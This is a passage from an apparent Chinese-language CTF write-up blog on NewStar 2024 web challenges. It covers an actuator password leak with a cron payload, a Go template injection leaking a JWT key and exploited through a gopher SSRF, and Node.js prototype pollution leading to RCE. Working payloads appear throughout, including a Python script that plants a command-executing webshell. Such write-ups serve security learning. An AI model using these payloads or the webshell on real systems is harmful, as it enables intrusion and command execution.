<p><img alt="52" loading="lazy" src="../../images/Newstar/2024/52.png"></p>
<p>最后跟进<code>/A/exts/ma.php</code>进行命令执行</p>
<p><img alt="53" loading="lazy" src="../../images/Newstar/2024/53.png"></p>
<p>没注意群里的提醒是不出网的，一直在想着出网，解题思路和我想的基本一致。</p>
<h3 id="隐藏的密码复现">隐藏的密码(复现)<a hidden class="anchor" aria-hidden="true" href="#隐藏的密码复现">#</a></h3>
<p>java还没会，学一下。找不到密码目录扫描</p>
<p><img alt="54" loading="lazy" src="../../images/Newstar/2024/54.png"></p>
<p>可以扫到 <code>env</code> 和 <code>jolokia</code> 端点</p>
<p><img alt="55" loading="lazy" src="../../images/Newstar/2024/55.png"></p>
<p>可以找到 <code>caef11.passwd</code> 属性是隐藏的</p>
<p><img alt="56" loading="lazy" src="../../images/Newstar/2024/56.png"></p>
<p>读到密码后，根据题目描述和属性的名字可得用户名为 <code>caef11</code></p>
<p>通过写定时任务（计划任务）的方式，以 flag 为文件名在根目录创建新文件，通过 <code>ls</code> 查看 flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>*/1 <span style="font-style:italic">* *</span> <span style="font-style:italic">* *</span> root cat /flag | xargs -I {} touch /{}
</span></span></code></pre></div><p>具体就不会写了，不会java的有苦头了，之后有空一定学。</p>
<h3 id="pangbai-过家家4复现">PangBai 过家家（4）(复现)<a hidden class="anchor" aria-hidden="true" href="#pangbai-过家家4复现">#</a></h3>
<p>hint:You just need to read main.go for solving this challenge.</p>
<p>直接定位<code>main.go</code>文件，前端在/eye路由上存在模板注入，定位一下关键代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">tmplStr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Replace</span>(string(<span style="color:#a6e22e">content</span>), <span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">input</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">tmpl</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">template</span>.<span style="color:#a6e22e">New</span>(<span style="color:#e6db74">&#34;eye&#34;</span>).<span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">tmplStr</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// render template</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">helper</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">Helper</span>{<span style="color:#a6e22e">User</span>: <span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">Config</span>: <span style="color:#a6e22e">config</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">tmpl</span>.<span style="color:#a6e22e">Execute</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">helper</span>)
</span></span></code></pre></div><p>将 <code>content</code> 中的所有 <code>&quot;%s&quot;</code> 替换为 <code>input</code> 字符串，从而生成最终的模板字符串 <code>tmplStr</code></p>
<p>定义并实例化 <code>Helper</code> 结构体，将 <code>user</code> 和 <code>config</code> 数据结构传入，用于后续的模板渲染。这个 <code>Helper</code> 结构体充当模板中的数据源</p>
<p><code>Execute</code> 方法用于将 <code>helper</code> 中的数据渲染进模板 <code>tmpl</code> 中，并输出到 <code>w</code>（例如 <code>http.ResponseWriter</code>）。这里会将 <code>helper</code> 中的字段（如 <code>User</code>、<code>Config</code> 等）渲染到模板中被占位符引用的位置。</p>
<p>引用官方的解释</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>tmpl.Execute 函数用于将 tmpl 对象中的模板字符串进行渲染，第一个参数传入的是一个 Writer 对象，后面是一个上下文，在模板字符串中，可以使用 {{ . }} 获取整个上下文，或使用 {{ .A.B }} 进行层级访问。若上下文中含有函数，也支持 {{ .Func &#34;param&#34; }} 的方式传入变量。并且还支持管道符运算。
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>在本题中，由于 utils.go 定义的 Stringer 对象中的 String 方法，对继承他的每一个 struct，在转换为字符串时都会返回 [struct]，所以直接使用 {{ . }} 返回全局的上下文结构会返回 [struct].
</span></span></code></pre></div><p>在/eye路由下，可以追溯<code>Helper</code>和<code>Config</code>两个结构体，可以尝试获取Jwt</p>
<p><img alt="61" loading="lazy" src="../../images/Newstar/2024/61.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>AYZowY3EtOmSZpn3Zh0TaGCMY72SMDSr2LvK5a3zYc7OD2cNpN0KkvnsClLkLJ95
</span></span></code></pre></div><p>然后看另外一个路由/favorite</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">routeFavorite</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Method</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">MethodPut</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ensure only localhost can access</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">requestIP</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">RemoteAddr</span>[:<span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">LastIndex</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">RemoteAddr</span>, <span style="color:#e6db74">&#34;:&#34;</span>)]
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Request IP:&#34;</span>, <span style="color:#a6e22e">requestIP</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">requestIP</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">requestIP</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;[::1]&#34;</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusForbidden</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;Only localhost can access&#34;</span>))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Cookie</span>(<span style="color:#e6db74">&#34;token&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">o</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">validateJwt</span>(<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">Value</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>()))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">Name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;PangBai&#34;</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusAccepted</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;Hello, PangBai!&#34;</span>))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">o</span>.<span style="color:#a6e22e">Name</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;Papa&#34;</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusForbidden</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;You cannot access!&#34;</span>))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">body</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadAll</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Body</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">w</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">SignaturePath</span> = string(<span style="color:#a6e22e">body</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;ok&#34;</span>))
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>网页的右下角是个文件读的结果，文件路径默认为 <code>config.SignaturePath</code> 即 <code>./sign.txt</code> 的内容。</p>
<p>代码说明了如果是<code>PUT</code>请求可以进入修改<code>config.SignaturePath</code> 的值，但是需要让name值为<code>Papa</code>才能进行</p>
<p>这里先构造一个jwt伪造(注意密钥不要带多余的空格)</p>
<p><img alt="65" loading="lazy" src="../../images/Newstar/2024/65.png"></p>
<p>于是解题思路：利用泄露的 <code>JwtKey</code> 伪造 Cookie，对 <code>/favorite</code> 发起 PUT 请求以修改 <code>config.SignaturePath</code>，然后访问 <code>/favorite</code> 获取文件读的内容。同时题目还给了限制必须来自<code>127.0.0.1</code></p>
<p>定位代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">Helper</span>) <span style="color:#a6e22e">Curl</span>(<span style="color:#a6e22e">url</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Curl:&#34;</span>, <span style="color:#a6e22e">url</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;curl&#34;</span>, <span style="color:#e6db74">&#34;-fsSL&#34;</span>, <span style="color:#e6db74">&#34;--&#34;</span>, <span style="color:#a6e22e">url</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Error: curl:&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;error&#34;</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ok&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>定义了一个名为 <code>Curl</code> 的方法，它属于 <code>Helper</code> 结构体，并通过调用 <code>curl</code> 命令去访问指定的 URL。它的主要功能是发送一个 HTTP 请求并返回结果。<code>--</code> 的存在，我们没有办法进行任何命令注入或选项控制，但 curl 命令并不是只能发起 HTTP 请求，它也支持其它很多的协议，例如 FTP、Gopher 等，其中 Gopher 协议能满足我们的要求。</p>
<p><img alt="62" loading="lazy" src="../../images/Newstar/2024/62.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>PUT /favorite HTTP/1.1
</span></span><span style="display:flex;"><span>Host: localhost:8000
</span></span><span style="display:flex;"><span>Content-Type: text/plain
</span></span><span style="display:flex;"><span>Cookie: token=
</span></span><span style="display:flex;"><span>Content-Length: 18
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/proc/self/environ
</span></span></code></pre></div><p>然后构造 PUT 请求原始报文，Body 内容为想要读取的文件内容，这里读取环境变量</p>
<p><img alt="63" loading="lazy" src="../../images/Newstar/2024/63.png"></p>
<p>读取之后前去可以查看flag</p>
<p><img alt="64" loading="lazy" src="../../images/Newstar/2024/64.png"></p>
<h3 id="ezpollute复现">ezpollute(复现)<a hidden class="anchor" aria-hidden="true" href="#ezpollute复现">#</a></h3>
<p>看一下部署文件Node.js 版本为 16，使用了 <code>node-dev</code> 热部署启动</p>
<p>在<code>index.js</code>里面的<code>/config</code>路由下存在<code>merge</code>,大概率存在原生链污染</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">finalConfig</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clone</span>(<span style="color:#a6e22e">defaultWaterMarkConfig</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">finalConfig</span>, <span style="color:#a6e22e">userConfig</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;uploads&#39;</span>, <span style="color:#a6e22e">userID</span>, <span style="color:#e6db74">&#39;config.json&#39;</span>), <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">finalConfig</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Config updated successfully&#39;</span>,
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Some error occurred&#39;</span>,
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">clone</span>, <span style="color:#a6e22e">merge</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./utils/merge&#39;</span>)
</span></span></code></pre></div><p><code>merge</code> 函数在 <code>/util/merge.js</code> 中，跳过名为 <code>__proto__</code> 的属性，以防止原型链污染漏洞；跳过值为空字符串 <code>&quot;&quot;</code> 的属性。但我们可以通过 <code>constructor.prototype</code> 来绕过限制(<code>constructor.prototype</code> 是对象的一个属性，可以用来访问并修改对象的原型。)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">merge</span>.<span style="color:#a6e22e">js</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;__proto__&#34;</span>) <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">target</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>/process</code> 路由调用了 <code>fork</code>，创建了一个 JavaScript 子进程用于水印添加</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">reject</span>) =&gt; {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">proc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>(<span style="color:#a6e22e">PhotoProcessScript</span>, [<span style="color:#a6e22e">userDir</span>], { <span style="color:#a6e22e">silent</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> })
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">proc</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;close&#39;</span>, (<span style="color:#a6e22e">code</span>) =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">code</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;success&#39;</span>)
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reject</span>(<span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;An error occurred during execution&#39;</span>))
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">proc</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reject</span>(<span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">`Failed to start subprocess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">message</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>))
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Photos processed successfully&#39;</span>,
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>可以污染 <code>NODE_OPTIONS</code> 和 <code>env</code>，在 <code>env</code> 中写入恶意代码，<code>fork</code> 在创建子进程时就会首先加载恶意代码，从而实现 RCE,但题目不出网，所以需要换一种写法</p>
<p>这种写法在复现的时候没打通，按道理是可以的因为有root权限</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;constructor&#34;</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;prototype&#34;</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;NODE_OPTIONS&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;--require /proc/self/environ&#34;</span>, <span style="color:#e6db74">&#34;env&#34;</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#34;EVIL&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;console.log(require(\&#34;child_process\&#34;).execSync(\&#34;cp /flag static/script.js\&#34;).toString())//&#34;</span>}}}}
</span></span></code></pre></div><p>官p的思路差不多写个shell进去</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://url:port&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 获取 token</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 随便发送点图片获取 token</span>
</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;images&#39;</span>, (<span style="color:#e6db74">&#39;anno.png&#39;</span>, open(<span style="color:#e6db74">&#39;./1.png&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>), <span style="color:#e6db74">&#39;image/png&#39;</span>)),
</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;images&#39;</span>, (<span style="color:#e6db74">&#39;soyo.png&#39;</span>, open(<span style="color:#e6db74">&#39;./2.png&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>), <span style="color:#e6db74">&#39;image/png&#39;</span>))
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/upload&#34;</span>, files<span style="color:#f92672">=</span>files)
</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Set-Cookie&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;token=([a-f0-9\-\.]+)&#39;</span>, token)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#66d9ef">match</span>:
</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> <span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] token: </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;token=</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 写入 WebShell</span>
</span></span><span style="display:flex;"><span>webshell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">const Koa = require(&#39;koa&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">const Router = require(&#39;koa-router&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">const app = new Koa()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">const router = new Router()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">router.get(&#34;/webshell&#34;, async (ctx) =&gt; {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    const </span><span style="color:#e6db74">{cmd}</span><span style="color:#e6db74"> = ctx.query
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    res = require(&#39;child_process&#39;).execSync(cmd).toString()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return ctx.body = {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        res
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">})
